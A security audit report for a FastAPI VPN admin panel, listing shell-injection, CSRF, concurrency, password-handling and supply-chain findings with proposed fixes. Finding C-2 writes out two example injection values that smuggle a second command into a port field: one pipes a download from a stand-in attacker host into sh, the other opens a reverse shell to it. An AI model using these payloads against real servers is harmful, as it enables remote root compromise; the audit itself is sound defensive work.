# Risk Audit — Amnezia Web Panel

*Audited: 2026-04-17. Codebase: commit 340138f (`v1.4.2`). Auditor: The Tightener.*

---

## Executive Summary

The panel is an admin-only control plane that runs shell commands on remote servers with root privileges. That premise demands near-zero tolerance for auth bypasses and shell injection. The code does several things right — PBKDF2 password hashing, scoped session checks on most routes, and `asyncio.to_thread` wrapping in the traffic loop. But there are five issues that should block any production deployment:

1. **`perform_toggle_user` is called but never defined** — two code paths that call it will raise `NameError` at runtime, causing a 500 response but also silently bypassing the user-disable logic the background task depends on.
2. **`port` parameter lands verbatim in shell commands** — a string like `"1234; curl attacker.com/shell | sh"` passed to `/api/servers/{id}/install` becomes a remote root shell one-liner.
3. **Blocking Paramiko calls on the async event loop** — every route except the traffic-sync loop and one user-connection route executes `ssh.connect()` and all manager methods directly on the event loop thread, blocking all other requests for seconds to minutes per call.
4. **No CSRF protection** — all state-changing POST routes accept cookie sessions but impose no CSRF token or `SameSite` constraint, making every admin action reachable via a cross-site form post.
5. **`data.json` written non-atomically, and `save_data()` called outside the lock everywhere** — two concurrent requests can produce a torn/empty file on crash, and the lock is almost entirely decorative.

The remaining items below are serious but do not individually justify shipping an emergency fix.

---

## Critical Issues

### C-1 — Undefined `perform_toggle_user` causes runtime NameError

**Severity:** Critical  
**Location:** `app.py:1788`, `app.py:1824`

**What's wrong:**  
`perform_toggle_user` is called in two places — once inside `api_update_user` (auto-re-enable on limit increase) and once as the sole body of `api_toggle_user` — but the function is never defined anywhere in the codebase. Calling it raises `NameError`. `api_toggle_user` is completely broken; every admin toggle returns a 500. In `api_update_user`, the exception is swallowed by the surrounding `try/except`, so a user whose limit was increased will silently stay disabled.

**Why it matters:**  
`api_toggle_user` is the primary on/off switch for VPN users. The background traffic loop calls `perform_mass_operations(toggle_uids=...)` which correctly goes through `_manager_call`, but any direct admin toggle of a single user is dead. Additionally the background loop uses `perform_toggle_user` path as well via the update route.

**Proposed fix:**  
Add the missing function (it is clearly the single-user version of the mass-ops toggle):

```python
async def perform_toggle_user(data: dict, user_id: str, enabled: bool) -> bool:
    user = next((u for u in data['users'] if u['id'] == user_id), None)
    if not user:
        return False
    user['enabled'] = enabled
    await perform_mass_operations(toggle_uids=[(user_id, enabled)])
    return True
```

---

### C-2 — Unsanitized `port` string injected into remote shell commands

**Severity:** Critical  
**Location:** `app.py:489–494` (`InstallProtocolRequest`), `app.py:1232`, `app.py:1238–1242`; `awg_manager.py:322`, `xray_manager.py:219–220`, `wireguard_manager.py:207`

**What's wrong:**  
`InstallProtocolRequest.port` is declared as `str` with no validation. It flows directly into `manager.install_protocol(port=req.port)` and from there into shell commands like:

```bash
docker run -d ... -p {port}:{port}/udp ...
```

A value of `"55424; bash -i >& /dev/tcp/attacker.com/4444 0>&1 #"` executes as a root shell command on the target server. This route is admin-only, but a CSRF attack (see C-4), a support-role user with the right permissions, or a stolen session can trigger it. The same issue applies to `tls_domain` in `telemt_manager.py:97` (regex-substituted into config but then passed through `run_sudo_command`).

**Why it matters:**  
Root shell on every managed VPN server, triggered through the panel's own install flow.

**Proposed fix:**  
Validate `port` is a plain integer in range at the Pydantic layer:

```python
from pydantic import field_validator

class InstallProtocolRequest(BaseModel):
    port: str = '55424'

    @field_validator('port')
    @classmethod
    def port_must_be_numeric(cls, v):
        if not v.isdigit() or not (1 <= int(v) <= 65535):
            raise ValueError('port must be a number 1-65535')
        return v
```

Do the same for `tls_domain` — allow only hostname characters (`[A-Za-z0-9.-]`).

---

### C-3 — Blocking Paramiko calls on the asyncio event loop thread

**Severity:** Critical  
**Location:** `app.py:1002`, `1054`, `1079`, `1106`, `1159`, `1225`, `1266`, `1307`, `1337`, `1373`, `1416`, `1453`, `1507`, `1576`, `1594` — essentially every SSH-touching route

**What's wrong:**  
The pattern across the codebase is:

```python
ssh.connect()          # blocks — TCP + auth negotiation, 1–15s
result = manager.install_protocol(...)  # blocks — multiple docker exec calls, up to 5 min
ssh.disconnect()
```

All of these execute on the asyncio event loop thread. FastAPI/Starlette with a single uvicorn worker (the default and the run configuration in `app.py:2290`) has one event loop thread. While one request is blocking in `ssh.connect()` or `docker build`, the entire panel is frozen — login page, background traffic sync, all of it. The CLAUDE.md notes this and says "wrap in `asyncio.to_thread`", but only the background traffic loop and one user-connection route actually do this.

**Why it matters:**  
Install operations take 2–5 minutes. During that time, the panel is completely unresponsive. The background traffic sync, which also uses Paramiko in `_scrape_server_traffic`, runs correctly via `asyncio.to_thread`, but an in-progress install will block its scheduled run. At scale with multiple admins, one slow SSH target freezes everyone else.

**Proposed fix:**  
Wrap every `ssh.connect()` and manager method call in `asyncio.to_thread(...)`. The pattern is already demonstrated at `app.py:238` and `app.py:1849–1872` — apply it consistently:

```python
await asyncio.to_thread(ssh.connect)
result = await asyncio.to_thread(manager.install_protocol, req.protocol, port=req.port)
await asyncio.to_thread(ssh.disconnect)
```

---

### C-4 — No CSRF protection on any state-changing route

**Severity:** Critical  
**Location:** `app.py:38` (SessionMiddleware), all `@app.post` routes

**What's wrong:**  
The session cookie is set by Starlette's `SessionMiddleware` with default options. The default does not set `SameSite=Strict` or `SameSite=Lax`, nor is any CSRF token checked. Any page on any origin can POST to `/api/users/{id}/delete`, `/api/servers/{id}/install`, `/api/settings/save` etc., with the admin's browser automatically including the session cookie. An attacker who convinces an admin to visit a malicious page can delete users, install protocols, change settings, or trigger SSH commands with root privileges.

The `tls_domain` validation issue from C-2 makes this worse: a CSRF-triggered install with a crafted `tls_domain` could execute arbitrary commands on every managed server.

**Why it matters:**  
This is a security-adjacent admin panel that operators are likely to use while also browsing the web. The blast radius of a single successful CSRF is root-level code execution on VPN infrastructure.

**Proposed fix — two lines:**  
Pass `same_site="strict"` and `https_only=True` (when SSL is enabled) to `SessionMiddleware`:

```python
app.add_middleware(
    SessionMiddleware,
    secret_key=os.environ.get('SECRET_KEY', secrets.token_hex(32)),
    same_site="strict",
    https_only=ssl_conf.get('enabled', False),
)
```

`SameSite=Strict` blocks cross-origin POSTs completely without requiring token infrastructure. This is sufficient for a panel with no legitimate cross-origin use cases.

---

### C-5 — `data.json` written non-atomically; `save_data()` called outside the lock in most routes

**Severity:** Critical  
**Location:** `app.py:111–113` (`save_data`), `app.py:1016`, `1038`, `1088`, `1203`, `1248`, `1274`, `1487`, `1516`, `1705`, `1745`, `1783`, `1789`, `1810`, `1827`, `1887`, `1951`, `2115`, `2147`, `2153` — 20+ call sites that bypass `DATA_LOCK`

**What's wrong:**  
`save_data()` writes the file with `open(DATA_FILE, 'w', ...)` then `json.dump()`. If the process crashes between open (which truncates the file) and the final `}` being written, `data.json` becomes empty or truncated, permanently destroying all configuration. There is no tmp-file-then-rename idiom.

More immediately: `DATA_LOCK` is an `asyncio.Lock`. Calling `save_data(data)` outside the lock (as almost every route does) doesn't help at all — even `async with DATA_LOCK: save_data(data)` only guards against concurrent coroutines, not against the background task writing simultaneously with a request handler. The lock is used correctly only in `save_data_async` and inside `perform_mass_operations`, but `save_data_async` is almost never called from the routes.

**Why it matters:**  
Two concurrent admin actions (e.g., add user + install protocol) both call `load_data()` → modify → `save_data()`. Whichever writes last wins; the other's change is silently lost. A crashed install during the save window truncates the file. On a VPS under I/O pressure, this is not rare.

**Proposed fix:**  
1. Make `save_data` atomic with tmp+rename:

```python
import tempfile

def save_data(data):
    dir_ = os.path.dirname(DATA_FILE)
    with tempfile.NamedTemporaryFile('w', dir=dir_, delete=False,
                                     encoding='utf-8', suffix='.tmp') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
        tmp = f.name
    os.replace(tmp, DATA_FILE)  # atomic on POSIX
```

2. Routes must use `save_data_async` (which holds the lock), not bare `save_data`:

```python
await save_data_async(data)
```

The proper fix for lost-update races requires a load-inside-lock pattern. `save_data_async` already does this; routes need to reload inside the lock before mutating.

---

## High Issues

### H-1 — Concurrent Paramiko `exec_command` on shared SSH client in `api_check_server`

**Severity:** High  
**Location:** `app.py:1168–1205`

`api_check_server` creates one `SSHManager` / one `paramiko.SSHClient`, then submits 7 `check_proto` callables to a `ThreadPoolExecutor`. All 7 threads call `ssh.run_sudo_command(...)` → `self.client.exec_command(...)` concurrently on the same Paramiko client. Paramiko's `SSHClient.exec_command` is not documented as thread-safe for concurrent calls on the same transport. In practice this produces intermittent "Channel closed" errors or silently mixes stdout streams between channels. The result is wrong protocol status data silently saved to `data.json`.

**Proposed fix:**  
Create a separate `SSHManager` per thread inside `check_proto`, connecting and disconnecting independently. The overhead of 7 sequential SSH connections is acceptable here; the check is not in the hot path.

---

### H-2 — `SECRET_KEY` randomized per-process if unset; SSL private key world-readable in `./ssl_temp/`

**Severity:** High  
**Location:** `app.py:38`, `app.py:2260–2274`

**SECRET_KEY:** If the `SECRET_KEY` env var is not set (it is not set in the `docker-compose.yml` or `Dockerfile`), a new random key is generated on every startup. Every process restart — including Docker container restarts — invalidates all user sessions. The CLAUDE.md acknowledges this, but the default deployment has no mitigation. Users will be logged out on every deploy or crash.

**Proposed fix:** Generate the key once, store it in `data.json['settings']['secret_key']` on first run (using `secrets.token_hex(32)`), and load it from there. If the env var is set, prefer that.

**SSL temp files:** `ssl_temp/cert.pem` and `ssl_temp/key.pem` are written without explicit permissions (`open(f, 'w')`). On most Linux systems this produces `0o644` (world-readable). The TLS private key is readable by any local user on the host. For Docker deployments with bind-mounted volumes this also exposes the key to host users.

**Proposed fix:** Write the files with `os.open(path, os.O_WRONLY|os.O_CREAT|os.O_TRUNC, 0o600)` and wrap with `open(fd, 'w')`.

---

### H-3 — Login has no rate limiting or account lockout

**Severity:** High  
**Location:** `app.py:955–975`

The `/api/auth/login` endpoint checks a captcha only if `settings.captcha.enabled` is `True`, and that setting is `False` by default. There is no attempt counter, no lockout, no rate-limit middleware. An attacker can brute-force the admin password at full network speed. PBKDF2 with 100k iterations slows individual checks to ~10ms server-side, which means roughly 100 guesses/second from a single machine — a 6-character lowercase password is crackable in under an hour.

**Proposed fix:**  
Add in-memory per-IP and per-username attempt tracking with exponential backoff, or add a short `asyncio.sleep(1)` on failed login. The captcha feature exists but is off by default — make it opt-out, not opt-in.

---

### H-4 — `verify_password` uses non-constant-time string comparison

**Severity:** High  
**Location:** `app.py:173`

```python
return new_h.hex() == h
```

`str.__eq__` short-circuits on first differing byte, leaking timing information. For a remote login endpoint this is a marginal risk (network jitter dominates), but for the share-page password check (`app.py:1979`) where the timing difference may be more measurable, it is a concrete issue.

**Proposed fix:**  
```python
import hmac
return hmac.compare_digest(new_h.hex(), h)
```

---

### H-5 — Dead and misleading dependencies in `requirements.txt`

**Severity:** High (supply-chain hygiene)  
**Location:** `requirements.txt:11,29`

`Flask==3.1.0` is in the requirements. The project uses FastAPI exclusively — Flask is never imported. It drags in `Werkzeug`, `Blinker`, `ItsDangerous`, `Click`, `colorama` — none of which are used directly. `python-telegram-bot==20.7` is listed, but the CLAUDE.md explicitly states "uses raw httpx — not python-telegram-bot". That package pulls in `httpcore`, `apscheduler`, `cachetools`, `tornado`, etc.

Dead dependencies increase the attack surface: any CVE in Flask, python-telegram-bot, or their transitive deps applies to this package even though the code never touches them.

**Proposed fix:**  
Remove `Flask` and `python-telegram-bot` from `requirements.txt`. If `Werkzeug` is genuinely needed (it appears unused), add it directly.

---

### H-6 — Background loop `save_data(curr_data)` at line 831 is inside `async with DATA_LOCK` but is the sync variant

**Severity:** High  
**Location:** `app.py:774–831`

```python
async with DATA_LOCK:
    curr_data = load_data()
    ...
    save_data(curr_data)   # sync, not save_data_async
```

`save_data` calls `open()` and `json.dump()` directly on the event loop thread while holding `DATA_LOCK`. This blocks the event loop for as long as the write takes (typically milliseconds, but on a slow VPS or when the file is large, can be tens of ms). Since this is inside the lock, no other coroutine can acquire `DATA_LOCK` during that window, but the event loop itself is stalled. Any route that calls `save_data_async` will now wait for both the disk write to finish and the previous lock holder to release — effectively serializing all writes sequentially on the event loop.

**Proposed fix:**  
Replace the `save_data(curr_data)` call inside the lock with `await asyncio.to_thread(save_data, curr_data)`. This keeps the lock held (preventing concurrent writes) while offloading the disk I/O to a thread pool.

---

## Medium Issues

### M-1 — `perform_delete_user` calls `ssh.connect()` synchronously inside an `async` function

**Severity:** Medium  
**Location:** `app.py:177–197`

`perform_delete_user` is async but calls `get_ssh(server)`, `ssh.connect()`, `_manager_call(...)`, and `ssh.disconnect()` without `asyncio.to_thread`. Every SSH operation blocks the event loop. This function is called from `api_delete_user` (which has a 5-minute SSH timeout per connection per user deletion).

---

### M-2 — `verify_password` with empty `password_hash` succeeds silently for Remnawave users

**Severity:** Medium  
**Location:** `app.py:399` (`password_hash: ''`), `app.py:168–174`

Users imported from Remnawave have `password_hash = ''`. If one of these users tries to log in with any password, `verify_password` calls `''.split('$', 1)` which raises `ValueError` (not enough values to unpack), caught by the bare `except Exception: return False`. So login is correctly blocked. But if the Remnawave import creates a user with a username that collides with an existing local user (matched by username at `app.py:373`), the local user's `password_hash` is overwritten with `''`. That user can no longer log in.

---

### M-3 — `awg_manager.py:858,1061`: `peer_section` double-quoted inside single-quoted bash command — `$` injection

**Severity:** Medium  
**Location:** `awg_manager.py:857–861`, `1059–1062`

```python
escaped_peer = peer_section.replace("'", "'\\''")
self.ssh.run_sudo_command(
    f"docker exec -i {container_name} bash -c 'echo \"{escaped_peer}\" >> {config_path}'"
)
```

The peer section is placed inside double-quotes inside the inner bash string. Single-quote escaping is applied, but double-quotes permit `$variable` and `` `backtick` `` expansion. The PSK and public key are base64 (`[A-Za-z0-9+/=]`) and cannot inject shell. However if the `psk` value ever came from a different source or was reconstructed from config content, a stray `$(...)` sequence would execute on the remote server as root.

The safe pattern is a heredoc or writing the content via SFTP (which `_save_clients_table` already does correctly). Switch `echo "..."` to writing via `upload_file` + `docker cp`.

---

### M-4 — `config_script` in `_configure_container` uses a single-quoted heredoc inside a bash -c single-quoted string

**Severity:** Medium  
**Location:** `awg_manager.py:398–469`

The AWG param values (`junk_packet_count`, etc.) are generated by `generate_awg_params()` which uses `random.randint` — fine. But those values are interpolated into `config_script`, which is then passed to:

```python
f"docker exec -i {container_name} bash -c '{config_script}'"
```

The single-quote escape in `run_sudo_command` strips only leading `sudo `. The `config_script` itself is never shell-escaped. If `awg_params` ever arrives from a stored/restored `data.json` (e.g., after a backup restore with tampered values), embedded shell metacharacters execute as root inside the container.

At the current code paths this is low-probability because `awg_params` is generated locally — but it is passed through `data.json` and restored via `api_backup_restore`. Validate all AWG param values as integers before use.

---

### M-5 — Xray Dockerfile pulls a pinned-but-unverified binary from GitHub releases

**Severity:** Medium  
**Location:** `xray_manager.py:81`

```
RUN curl -L -o /root/xray.zip "https://github.com/XTLS/Xray-core/releases/download/v1.8.4/Xray-linux-64.zip"
```

Version `v1.8.4` is hardcoded. There is no checksum verification. If GitHub, the CDN, or a MITM serves a modified binary, it runs inside a privileged Docker container on the VPN server. The xray binary is installed in `/usr/bin/xray` and executed as root. This is a build-time supply-chain risk.

**Proposed fix:** Pin the sha256 of the expected zip and verify it with `openssl dgst -sha256 -verify` or `sha256sum` before unzipping.

---

## Low Issues

### L-1 — `set_lang` endpoint accepts arbitrary referer for redirect

**Severity:** Low  
**Location:** `app.py:862–866`

```python
ref = request.headers.get("referer", "/")
response = RedirectResponse(url=ref)
```

`Referer` is a request header; an attacker can set it to any URL. `RedirectResponse` with a full URL redirects the browser off-site. This is a low-severity open redirect — it does not expose any data but can be used in phishing chains.

**Proposed fix:** Validate that `ref` starts with `/` before redirecting: `ref = ref if ref.startswith('/') else '/'`.

---

### L-2 — `api_backup_restore` replaces live data without migrations or validation of nested structure

**Severity:** Low  
**Location:** `app.py:2217–2249`

The restore endpoint validates only that `servers` and `users` keys exist as lists, then writes the blob directly. A backup from an older schema version (missing `share_token`, `traffic_reset_strategy`, etc.) bypasses the startup migration. Fields expected by routes (e.g., `share_token`) will be absent, causing `KeyError` or `AttributeError` on first access.

**Proposed fix:** After restoring, call the migration logic from `startup()` inline, or re-trigger it by calling `startup()` again.

---

### L-3 — `_sudo_prefix` single-quote escaping is insufficient for passwords containing newlines or backslashes

**Severity:** Low  
**Location:** `ssh_manager.py:95`, `113–117`, `138–140`

```python
escaped_pass = self.password.replace("'", "'\\''")
full_cmd = f"echo '{escaped_pass}' | sudo -S -p '' {clean_cmd}"
```

Single-quote escaping handles embedded `'` characters. A password containing a literal newline (`\n`) would terminate the `echo` command early and inject the remainder as a new shell statement. This requires an unusual password, but password fields accept arbitrary strings and there is no length or character validation.

**Proposed fix:** Use `printf '%s\n' "$PASSWORD"` with the password passed via environment variable, or use `pexpect`-style interaction rather than piping through the shell.

---

### L-4 — `_next_ip` allocation goes above `/24` subnet without wrapping

**Severity:** Low  
**Location:** `awg_manager.py:670–691`

When `last_octet == 254`, `next_octet` is set to `257`; when `== 255`, to `257` also. IPs above `.254` are invalid but are written into the WireGuard config. AWG rejects them and the `wg syncconf` call will fail silently. There is no subnet exhaustion check at all.

---

## Out of Scope / Deliberate Trade-offs

**Single-file JSON store (`data.json`):** For a single-operator VPN panel managing a handful of servers, SQLite or Postgres would be over-engineering. The JSON file is appropriate; the non-atomic write and missing lock discipline (C-5) are the actual problems, not the choice of storage.

**Default `admin`/`admin` credentials:** Seeded only when `data.users` is empty (first run), logged visibly. Operators are expected to change this on first login. Acceptable for this product class.

**`paramiko.AutoAddPolicy` (accepting all host keys):** The panel manages servers that users themselves provision; there is no pre-existing trust store to verify against. This is a deliberate product trade-off, though it does make the panel vulnerable to DNS/ARP spoofing redirecting an install to an attacker's server.

**No test suite:** Noted in CLAUDE.md. Out of scope for this audit but worth emphasizing: the `perform_toggle_user` bug (C-1) would have been caught by a trivial unit test.

**`random` instead of `secrets` for AWG obfuscation params (`awg_manager.py:69`):** These are obfuscation parameters, not cryptographic secrets. `random.randint` is acceptable here; the values just need to be unpredictable across installs, not cryptographically random.
